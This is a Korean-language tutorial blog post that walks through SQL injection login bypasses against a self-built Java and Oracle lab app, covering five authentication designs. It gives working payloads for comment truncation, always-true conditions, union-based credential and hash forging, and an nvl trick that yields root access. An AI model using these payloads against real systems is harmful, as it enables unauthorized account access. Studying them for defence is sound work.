---
title: "SQL Injection 로그인 우회"
excerpt: "SQL Injection"
tags:
    - SQL
    - Oracle DB
    - SQL Injection
    - Java
last_modified_at: 2023-04-19T09:13:00-05:00
---
## SQL Injection 이란?
- sql 질의문을 삽입하는 공격이다. 즉 sql 질의문에 악의적인 코드를 배치하는 공격이다.
- 웹 해킹 기술중 하나이다.

>목적
- 정보 유출
- 저장된 데이터 유출 및 조작
- 인증 우회

> 실습 환경
- DB 서버 : Rocky-8.7
- DB 버전 : oracle-database-xe-21c


>**members** 테이블 구조

|sid|id|password|email|info|hashpwd|
|---|---|---|---|---|---|
|integer PRIMARY KEY|VARCHAR(60)|VARCHAR(60)|VARCHAR(60)|VARCHAR(60)|CHAR(128)|

- **hashpwd** 컬럼은 password를 해시(SHA512) 암호화를 한 것 이다.
- 실제로 유저 정보를 저장하기 위한 테이블을 구성할 때는 해시 암호화된 비밀번호만 저장해야한다.

<br><br>
## 로그인 방식에 따른 sql 인젝션 공격방식
- 식별 
	- 많은 데이터 중에서 특별한 데이터를 가려내는것.

- 인증
	- 그 사람이 맞는지 확인하는 작업. ( 비밀번호 인증 )


#### 1. 식별과 인증을 동시에 할 때
- 하나의 `sql 질의문` 으로 식별과 인증을 완료한다.

>로그인방법
```sql
select * from members where id='아이디' and PASSWORD='비번'
```
- **아이디**와 **비밀번호**를 동시에 일치하면 사용자 정보가 나온다. 이러한 정보가 나오면 로그인에 성공한 것이다.
- 하지만 아무 정보도 안나오면 로그인에 실패 한 것이다.

>로그인 코드
<script src="https://gist.github.com/MinGyu2/348f7a0e850908a350bb766f307d8e9a.js"></script>
- 다음 코드를 통해 인증을 한다.
```java
var member = auth.authAndMember(id, pwd);
```


>정상적인 로그인<br>
![Pasted image 20230419141436](https://user-images.githubusercontent.com/31990118/232983137-92129ab9-a389-43c0-93b9-46e70de832ce.png)<br>![Pasted image 20230419141453](https://user-images.githubusercontent.com/31990118/232983198-a896785d-032c-47a7-9dac-905c0a7fe3a8.png) 

<br>
>**공격 방법**

- **주석을 이용한 인증우회(1)**

| | 입력|
|---|---|
|id|`user2'--`|
|pwd|` ` |

- 서버에서 완성된 쿼리문<br>
`select * from members where id='user2'--' and PASSWORD=' '`<br>![Pasted image 20230419044643](https://user-images.githubusercontent.com/31990118/232983978-af5bd6a4-cc9b-4c5b-a130-155f58121b71.png)<br>![Pasted image 20230419044620](https://user-images.githubusercontent.com/31990118/232984069-0c3d894b-edfe-43c0-a4b2-04349fee4065.png)

<br>
- **주석을 이용한 인증우회(2)**

| | 입력|
|---|---|
|id|`user2'/*` |
|pwd| `*/and '1'='1`|

- 서버에서 완성된 쿼리문<br>
`select * from members where id='user2'/*' and password='*/and '1'='1';`<br>![Pasted image 20230419141124](https://user-images.githubusercontent.com/31990118/232984619-32b03055-7784-4d7b-ad5e-15a7bf6f1dd8.png)<br>![Pasted image 20230419141032](https://user-images.githubusercontent.com/31990118/232984682-5b1c1f8e-bd5b-442c-a209-f732dcf21e26.png)
- 블럭 단위로 주석처리 하였다.

<br>
- **or 이용한 인증우회**

| | 입력|
| --- | ---|
|id| `user2' or '1'='1`|
|pwd|` ` |

- 서버에서 완성된 쿼리문<br>
`select * from members where id='user2' or '1'='1' and PASSWORD=' '`<br>![Pasted image 20230419141300](https://user-images.githubusercontent.com/31990118/232984798-75e83f27-fab3-4e09-b546-9f1bad9dff19.png)<br>![Pasted image 20230419141331](https://user-images.githubusercontent.com/31990118/232984846-083c960b-50c9-4344-b391-e4486fb22736.png)
- 비교연산자 우선순위에 의해 and 연산자 부분을 먼저 계산을 하고 or 연산을 계산한다.<br>`select * from members where (id='user2' or ('1'='1' and PASSWORD=' '))`

<br><br>
#### 2. 식별과 인증을 따로 할 때

>로그인방법
1.  유저가 입력한 id와 `sql 질의문`을 통해 id 정보와 비밀번호 정보를 불러온다.<br>`select id,PASSWORD from members where id='아이디' `
2. 입력받은 비밀번호와 db 에서 불러온 비밀번호를 비교하여 일치하는지 확인한다.
3. 일치하면 db 에서 불러온 id 정보를 통해 나머지 유저 정보도 불러온다.<br>`select * from members  where id='db에서 불러온 id정보';` 

>로그인 코드<br><script src="https://gist.github.com/MinGyu2/7714a6942bb2726177f0dcbfef5caaa7.js"></script>



>정상적인 로그인<br>
![Pasted image 20230419141842](https://user-images.githubusercontent.com/31990118/232985187-5a0d4782-8d8a-4f53-bdd6-c6e636026a14.png)<br>![Pasted image 20230419141903](https://user-images.githubusercontent.com/31990118/232985264-660444cd-f648-4933-8b3f-fb4b7d6e91c6.png)



>union을 이용한 우회 공격 전 정확한 **컬럼 수** 찾기
- `order by` 를 이용한다.
- `user2' order by 2 -- ` 로그인 성공<br>![Pasted image 20230419141937](https://user-images.githubusercontent.com/31990118/232985373-2f1890c3-e762-43ce-a675-28c7904f68ed.png)<br>![Pasted image 20230419141951](https://user-images.githubusercontent.com/31990118/232985437-96a4348c-56d8-4fe1-bd1c-9628a2324d0c.png)
- `user2' order by 3 -- ` 로그인 실패<br>![Pasted image 20230419142020](https://user-images.githubusercontent.com/31990118/232985581-b986925c-674e-45f9-a0a3-2d13dedb546d.png)<br>![Pasted image 20230419142050](https://user-images.githubusercontent.com/31990118/232985629-99e7085d-df98-4268-b513-18ce477eb459.png)
- 즉 컬럼의 수가 2개인 것을 확인할 수 있다.

<br>
>공격 방법

- **union + 주석 사용**

| | 입력|
| --- | ---|
|id| `x' union select 'user2','user2' from dual -- `|
|pwd| `user2`|

- 서버에서 완성된 쿼리문<br>
`select id,PASSWORD from members where id='x' union select 'user2','user2' from dual where '1'='1'`<br>![Pasted image 20230419142133](https://user-images.githubusercontent.com/31990118/232985841-7099d8b7-0441-4a9f-a001-5568d8614c67.png)<br>![Pasted image 20230419142152](https://user-images.githubusercontent.com/31990118/232985915-ea61d625-85cd-4bca-9e58-dd7836dc3101.png)


<br>
- **union + where 사용**

| | 입력|
| --- | ---|
|id| `x' union select 'user2','user2' from dual where '1'='1`|
|pwd|  `user2`|

- 서버에서 완성된 쿼리문<br>
`select id,PASSWORD from members where id='x' union select 'user2','user2' from dual where '1'='1'`<br>![Pasted image 20230419142239](https://user-images.githubusercontent.com/31990118/232986108-6e532e72-4254-4531-9464-ef82413d123f.png)
<br>![Pasted image 20230419142252](https://user-images.githubusercontent.com/31990118/232986157-f68af392-ddb2-4a6b-829e-62e9ce649116.png)





<br><br>
#### 3. 식별과 인증을 동시에 할 때(+ HASH 암호화된 비밀번호)
- 웹서버는 사용자 사용하는 비밀번호를 HASH 암호화 하여 서버에 저장한다.

>로그인 방법
- 하나의 `sql 질의문` 으로 식별과 인증을 완료한다는 것이다.
```sql
select * from members where id='입력id' and hashpwd=standard_hash('입력 pwd','SHA512');
```
- 웹 서버에서 pwd 를 바로 비교하는것이 아닌 **SHA512** 알고리즘으로 HASH 암호화한 값을 비교한다.
- **아이디**와 **비밀번호**를 동시에 일치하면 유저 정보가 나온다. 이러한 정보가 나오면 로그인에 성공한 것이다.
- 하지만 아무 정보도 안나오면 로그인에 실패 한 것이다.

>로그인 코드 <br>
<script src="https://gist.github.com/MinGyu2/10015945943d3c562131ca34225b8529.js"></script>


>정상적인 로그인<br>![Pasted image 20230419142438](https://user-images.githubusercontent.com/31990118/232986886-8bd775f2-b4ea-4d8f-81b5-1052e894f004.png)
<br>![Pasted image 20230419142455](https://user-images.githubusercontent.com/31990118/232986977-ab3e49bb-012e-40a8-b726-725242bf5d8d.png)


>nvl 함수 
- nvl 함수는 값이 null 인 경우 지정값을 출력하고 , 값이 null 아니면 그대로 출력한다.
- nvl(값,  지정값)
- '1' 은 null 이 아니다. 따라서 1이 출력된다.<br>![Pasted image 20230419143825](https://user-images.githubusercontent.com/31990118/232987098-fed02520-2eab-4f8d-bf02-4e386a3d8166.png)

<br>
>공격 방법

- **주석사용**

| | 입력|
| --- | ---|
|id|  `user2' -- `|
|pwd| ` `|

- 서버에서 완성된 쿼리문<br>
`select id from members where id='user2' -- ' and hashpwd=standard_hash('ksdjfaklsf','SHA512')`<br>![Pasted image 20230419142553](https://user-images.githubusercontent.com/31990118/232990015-656e3828-1f9c-44ac-aef5-404079e11f67.png)
<br>![Pasted image 20230419142616](https://user-images.githubusercontent.com/31990118/232990061-98b4cd2b-84f9-4ffb-85f8-3398a26fe40d.png)

<br><br>
- **주석 + or + nvl사용** (members 테이블의 가장 상위에 있는 root 로 로그인된다.)

| | 입력|
| --- | ---|
|id| `user2'/*`|
|pwd|  `*/ or '1'=nvl('1`|

- 서버에서 완성된 쿼리문<br>
`select id from members where id='user2'/*' and hashpwd=standard_hash('*/ or '1'=nvl('1','SHA512')`<br>![Pasted image 20230419142842](https://user-images.githubusercontent.com/31990118/232990160-db93d3d4-95cc-4498-90b2-0d20d2a552df.png)
<br>![Pasted image 20230419142857](https://user-images.githubusercontent.com/31990118/232990195-078251e2-8dec-4601-9bb3-b84fcd2eb24f.png)
- 여기서 user2 사용자가 아닌 root로 로그인 된 것을 확인할 수 있다. 
- 서버에서 완성된 쿼리는 모든 사용자 정보를 불러오고 서버는 사용자 정보들 중 맨위에 존재하는 사용자의 정보를 가져와 보여준다. 
- 테이블 맨위에는 root 사용자가 존재하여 root 계정으로 로그인된 것 이다.
<br><br>


- **주석 + and + nvl사용**

| | 입력|
| --- | ---|
|id| `user2'/*`|
|pwd|  `*/ and '1'=nvl('1`|

- 서버에서 완성된 쿼리문<br>
`select id from members where id='user2'/*' and hashpwd=standard_hash('*/ and '1'=nvl('1','SHA512')`<br>![Pasted image 20230419144106](https://user-images.githubusercontent.com/31990118/232990461-99c1e174-9ff6-4b03-ad3c-a65c52e55953.png)<br>![Pasted image 20230419144117](https://user-images.githubusercontent.com/31990118/232990496-9034bd9e-eb22-41a4-8351-925d908d97e8.png)

<br><br>
- **or 이용하기**

| | 입력|
| --- | ---|
|id|  `user2' or '1'='1`|
|pwd|` ` |

- 서버에서 완성된 쿼리문<br>
`select id from members where id='user2' or '1'='1' and hashpwd=standard_hash(' ','SHA512')`<br>![Pasted image 20230419143137](https://user-images.githubusercontent.com/31990118/232990748-9179397a-d4e8-4f39-b657-bbbcf04faa9c.png)<br>![Pasted image 20230419143153](https://user-images.githubusercontent.com/31990118/232990788-47801f8e-ce8b-453b-a9a3-b43bb8ba0b98.png)


<br><br>
#### 4. 식별과 인증을 따로 할 때(+ 비밀번호 SHA512 하여 table에 저장)

>로그인 방법
1.  유저가 입력한 id와 `sql 질의문`을 통해 id 정보와 해시로 저장된 비밀번호 정보를 불러온다.<br>`select id,hashpwd from members where id='아이디'`
2. 유저가 입력한 비밀번호를 해시 암호화 알고리즘을 통해 암호화 한다.
3. 유저가 입력한 해시화 된 비밀번호와 db에서 불러온 해시화된 비밀번호를 비교한다.
4. 서로 일치하면 db 에서 불러온 `id` 정보를 이용하여 나머지 유저 정보도 불러온다.

> 코드<br><script src="https://gist.github.com/MinGyu2/3ba980c0793432ddb51eb184be586ff3.js"></script>


>정상적인 로그인<br>![Pasted image 20230419150421](https://user-images.githubusercontent.com/31990118/232991349-687a4c81-ef26-4c32-80b0-5bc5760cfecc.png)
<br>![Pasted image 20230419150437](https://user-images.githubusercontent.com/31990118/232991402-b32657e8-1f6d-4feb-8c64-8ca1f3728d20.png)

>정확한 컬럼 수 찾기
- `order by` 를 이용한다.
- `user2' order by 2 -- ` 로그인 성공<br>![Pasted image 20230419144418](https://user-images.githubusercontent.com/31990118/232991510-58554a20-098d-4531-b5e1-f664afcb53b3.png)
- 컬럼수가 2개라는 것을 알 수 있다.

<br>
>공격방법

- **union 을 이용한다.**

| | 입력|
| --- | ---|
|id|`2' union select 'user2', cast(standard_hash('user2','SHA512') as char(128)) from dual --`|
|pwd|`user2` |

- 서버에서 완성된 쿼리문<br>
`select id,hashpwd from members where id='x' union select 'user2', cast(standard_hash('user2','SHA512') as char(128)) from dual -- '`<br>![Pasted image 20230419145121](https://user-images.githubusercontent.com/31990118/233049085-c016daf8-8467-47ad-8d63-26668bfc33ac.png)
<br>![Pasted image 20230419145133](https://user-images.githubusercontent.com/31990118/233049124-051680f1-71c0-45d5-b569-ff429fa6581a.png)


<br>
- **직접 해시 암호한 값을 넣어준다.**

| | 입력|
| --- | ---|
|id| `2' union select 'user2', hash('a','SHA512') from dual --`|
|pwd| `a`|

- hash('a','SHA512') = `1F40FC92DA241694750979EE6CF582F2D5D7D28E18335DE05ABC54D0560E0F5302860C652BF08D560252AA5E74210546F369FBBBCE8C12CFC7957B2652FE9A75`
- 서버에서 완성된 쿼리문<br>
`select id,hashpwd from members where id='2' union select 'user2', '1F40FC92DA241694750979EE6CF582F2D5D7D28E18335DE05ABC54D0560E0F5302860C652BF08D560252AA5E74210546F369FBBBCE8C12CFC7957B2652FE9A75' from dual --'`<br>![Pasted image 20230419145351](https://user-images.githubusercontent.com/31990118/233049465-179b0584-4be4-4702-a13a-e7ed0bb58b3c.png)
<br>![Pasted image 20230419145407](https://user-images.githubusercontent.com/31990118/233049512-f9fe88e5-5ccb-4863-89e5-be94b3eaef62.png)

<br>

- **주석 없이 하기**

| | 입력|
| --- | ---|
|id| `2' union select 'user2', cast(standard_hash('user2','SHA512') as char(128)) from dual where '1'='1 ` |
|pwd| `user2`|

- 서버에서 완성된 쿼리문<br>
`select id,hashpwd from members where id='2' union select 'user2', cast(standard_hash('user2','SHA512') as char(128)) from dual where '1'='1'`<br>
![Pasted image 20230419145543](https://user-images.githubusercontent.com/31990118/233049659-a8d081d7-b534-4236-917d-9fa5306b7205.png)
<br>![Pasted image 20230419145554](https://user-images.githubusercontent.com/31990118/233049710-435711d1-158a-4f42-849a-ace70d6b1dcc.png)

- standard_hash('user2','SHA512') 로 나오는 결과와 table 에 저장된 hash 로 암호화 된 패스워드는 타입이 다르다.
- 따라서 **cast 함수**를 이용하여 타입을 **char(128)** 로 변경하였다.

<br><br>



#### 5. 식별과 인증을 따로 할 때(+ id 두번 확인하기 )

>로그인방법
1.  유저가 입력한 id와 `sql 질의문`을 통해 id 정보와 비밀번호 정보를 불러온다.<br>`select id,PASSWORD from members where id='아이디' and id='아이디'`
2. 여기서 id를 두번 확인한 것을 알 수 있다.
3. 입력받은 비밀번호와 db 에서 불러온 비밀번호를 비교하여 일치하는지 확인한다.
4. 일치하면 db 에서 불러온 id 정보를 통해 나머지 유저 정보도 불러온다.<br>`select * from members  where id='db에서 불러온 id정보';` 

>로그인 코드<br>
<script src="https://gist.github.com/MinGyu2/4838aebdc75359591b92074aff22d9b9.js"></script>

>정상적인 로그인<br>
![Pasted image 20230419150308](https://user-images.githubusercontent.com/31990118/233050196-c0143052-3671-4b80-b093-26faa1a48362.png)
<br>![Pasted image 20230419150324](https://user-images.githubusercontent.com/31990118/233050247-58e103c1-83b5-4b53-bde1-bfff07bae2f4.png)


<br>
>정확한 컬럼 수 찾기
- `order by` 를 이용한다.
- `user2' order by 2 -- ` 로그인 성공<br>![Pasted image 20230419145849](https://user-images.githubusercontent.com/31990118/233050601-910ace99-8195-40c5-a231-ef871db2e4ab.png)<br>![Pasted image 20230419150003](https://user-images.githubusercontent.com/31990118/233050662-6455b018-b493-4f44-94fa-21555d6111c5.png)
-  `user2' order by 3 -- ` 로그인 실패
- 즉 컬럼의 수는 2개 라는것을 알 수 있다.

<br>

>공격방법

- **union + 주석 사용**

| | 입력|
| --- | ---|
|id| `x' union select 'user2','a' from dual -- `|
|pwd| `a`|

- 서버에서 완성된 쿼리문<br>
`select id,PASSWORD from members where id='x' union select 'user2','a' from dual -- ' and id='x' union select 'user2','a' from dual -- '`<br>![Pasted image 20230419150030](https://user-images.githubusercontent.com/31990118/233051049-a26dfe1e-a888-412b-a552-54f56d8b4f06.png)
<br>![Pasted image 20230419150041](https://user-images.githubusercontent.com/31990118/233051097-c07becb0-6e56-458a-b33d-1401cea13e36.png)

<br>


>특징
- id를 한번확인 하는 방법보다 2번 확인을 하면 공격자가 인증 쿼리 예측하기 힘들다.
- `where` 문을 추가할 수 없다.<br>id에 다음 쿼리를 입력하여도 로그인이 안된다.<br> `x' union select 'user2','user2' from dual where '1'='1`



<br><br>
### 단방향 해시 함수 
---
- 임이의 길이를 갖는 데이터를 고정된 길이의 데이터로 변환시켜주는 함수이다.
- 위변조 여부를 판별하거나, 무결성을 검증하는데 사용된다.
- 비밀번호를 서버에 안전하게 저장하기 위해 사용한다.
- MD5, SHA1, SHA256, SHA512 등이 있다.


### SQL 에 따른 주석 차이
---

| |mysql|oracle db|
|---|---|---|
|한줄 주석| #, --  | --
| 부분 주석 | /\*\*/ | /\*\*/

<br><br>

### Oracle SQL 연산자 우선순위
---

|연산자|설명|
|---|---|
|산술연산자| ** \* , /, +, - ** |
|연결연산자|\|\||
|비교연산자| =, > , < , >= , <= , <> , != , ^=|
|논리연사자|BETWEEN, NOT, AND, OR |
|SQL 연산자|LIKE, NOT LIKE, IN, EXISTS |
|집합 연산자|UNION ALL, UNION, INTERSECT, MINUS|

|순서 | 연산자|
|---|---|
|1|괄호|
|2|\* , /|
|3|+ , -|
|4|= , <> , < , > , <= , >=|
|5|IS (IS NULL, IS NOT NULL, IS EMPTY, IS NOT EMPTY)|
|6|BETWEEN|
|7|NOT|
|8|AND|
|9|OR|

